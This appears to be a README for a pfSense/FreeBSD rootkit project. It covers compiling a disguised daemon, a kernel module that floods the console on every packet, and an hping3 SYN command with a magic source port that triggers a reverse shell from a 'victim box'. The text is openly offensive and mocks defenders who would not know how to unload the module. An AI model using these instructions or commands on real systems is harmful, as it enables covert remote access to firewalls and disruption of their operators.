The "unused" directory holds the c code that compiles binaries.

To compile "apeshit" within pfsense you need to use "clang15 -I/sys -o apeshit apeshit_daemon.c" since stdio.h doesn't k know the path of cdefs.h. 

"apeshit_damon.c" produces "apeshit" which is a binary that creates a daemon that sleeps infinitly and is named apeshit, you can see it with "pgrep -l apeshit".

"brickbox.ko" posts an image and funny message everytime a packet comes in or goes out, this can actually be stopped by running <kldunload brickbox.ko> but who da hell is gonna know dat.  It is completely still possible to run commands but the screen prints really fast so it is hard to see shit.  Inside unused is "make_brick_box_face.c" which has comments at the top for the makefile and creates this bin.

To construct a packet that will trigger the packet filtering and send a reverse shell simply run
"sudo hping3 -S -p <destination port> -s 6969 <ip of victim box>"
from your host machine targeting the ip of the victim box that has the rootkit, currently any destination port works.
